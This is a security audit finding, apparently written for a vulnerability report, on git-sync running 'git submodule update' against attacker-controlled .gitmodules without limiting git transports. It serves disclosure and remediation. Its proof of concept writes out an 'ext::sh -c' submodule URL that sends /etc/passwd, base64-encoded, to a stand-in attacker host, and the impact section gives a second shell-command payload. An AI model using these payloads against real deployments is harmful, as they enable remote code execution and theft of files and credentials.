### Title
Unrestricted `git submodule update` on untrusted repo content enables arbitrary transport execution (`ext::`) - (File: `main.go`)

### Summary
`git-sync`'s `configureWorktree()` runs `git submodule update --init [--recursive]` against whatever `.gitmodules` content is present in the *attacker-controlled* upstream repository, with no restriction on which git transports/protocols are permitted for submodule URLs. This mirrors the `BURNER_ROLE` bug pattern: a privileged operation (running arbitrary git subcommands with the sidecar's full filesystem/network access) is exercised against an arbitrary, externally-supplied target (any submodule URL/protocol committed by whoever controls the tracked repo or branch) instead of being scoped to a known-safe set of protocols/paths.

### Finding Description
`repoSync.configureWorktree()` unconditionally executes submodule initialization for any repo it syncs when `--submodules` is not `off` (the default is `recursive`): [1](#0-0) 

The submodule URLs come entirely from `.gitmodules`, which is ordinary tracked file content in the synced repository — content that, in the git-sync threat model, is "untrusted repo content" reachable by anyone who can push to the ref/branch that git-sync follows. `git submodule update` will `git clone` each submodule URL, and git's URL/transport grammar supports the `ext::<command>` helper transport, which invokes an arbitrary shell command as the "clone" operation (this is the same class of issue historically fixed upstream in git core via `protocol.allow`/`GIT_ALLOW_PROTOCOL`, CVE-2022-39253/CVE-2017-1000117 class bugs). Nowhere in `main.go` does `git-sync` set `protocol.allow`, `protocol.ext.allow`, or `GIT_ALLOW_PROTOCOL` to restrict submodule transports before invoking `submodule update`; the only protocol-related config found in the codebase is `protocol.file.allow:always`, which is added by the *test harness* (`test_e2e.sh`), not by `main.go` itself: [2](#0-1) 

This is the git-sync analog of the `BURNER_ROLE` finding: a trusted/privileged actor (the sidecar process, which has host filesystem access and often credentials) performs an action (`git submodule update`) whose "target" (submodule transport/URL) is fully attacker-controlled, with no restriction limiting it to "self" (i.e., to the same transport/host as `--repo`, or to safe protocols only).

### Impact Explanation
If the git binary bundled/used by the sidecar does not itself enforce `protocol.allow=never` for risky transports (or the operator/base image predates the git-core fix, or config resets the allow-list), a malicious commit that adds a submodule entry with `url = ext::sh -c "id > /pwned"` (or a similar payload) would cause the git-sync container to execute arbitrary shell commands with the privileges of the sidecar process. This is direct code execution outside the intended sync contract, and could be used to exfiltrate credentials mounted into the container (SSH keys, `--password-file`, GitHub App private key) or write/delete files outside `--root`.

### Likelihood Explanation
Exploitability depends on the git version and its default protocol allow-list:
- Git >= 2.38.1 defaults to disallowing `ext::`/`file://` for submodule recursion unless explicitly permitted via `protocol.allow`/`GIT_ALLOW_PROTOCOL`.
- `git-sync` does not set any restrictive protocol configuration in `main.go`; it also exposes a generic `--git-config-add` flag that operators can (and, per `test_e2e.sh`, commonly do) use to loosen `protocol.file.allow`, which could be combined with older/customized git installs or misconfigured allow-lists to reopen this path.
- The attack requires: (a) `--submodules` not set to `off` (default is `recursive`), and (b) the git binary/environment not enforcing a strict protocol allow-list for submodule transports.

Given these preconditions, likelihood is moderate rather than guaranteed — it is contingent on git version/config rather than being exploitable against every deployment out of the box.

### Recommendation
- Before running `git submodule update`, explicitly set a restrictive `GIT_ALLOW_PROTOCOL` (or `-c protocol.allow=never -c protocol.https.allow=user -c protocol.ssh.allow=user`, matching the same protocols allowed for `--repo`) so submodule URLs cannot invoke `ext::` or other unexpected transports regardless of the host git's defaults or operator-supplied `--git-config`/`--git-config-add` overrides.
- Consider validating/sanitizing `.gitmodules` submodule URLs against an explicit allow-list of protocols before invoking `submodule update`, rather than relying solely on git core's own protections.
- Document that `--git-config-add`/`--git-config` should not be used to loosen `protocol.*.allow` settings, since this directly re-enables this class of issue.

### Proof of Concept
1. Deploy `git-sync` with default flags (`--submodules` unset, i.e. `recursive`) syncing an attacker-writable branch/ref.
2. Attacker with push access to that ref adds to `.gitmodules`:
   ```
   [submodule "evil"]
       path = evil
       url = ext::sh -c "curl attacker.example/$(cat /etc/passwd | base64)"
   ```
   and commits it (with a corresponding empty `evil` gitlink).
3. On the next sync cycle, `configureWorktree()` runs `git submodule update --init --recursive` [3](#0-2) , which — on a git installation/config that permits the `ext::` transport (older git, or an operator who has loosened `protocol.*.allow` via `--git-config-add`) — executes the attacker's command inside the sidecar container.
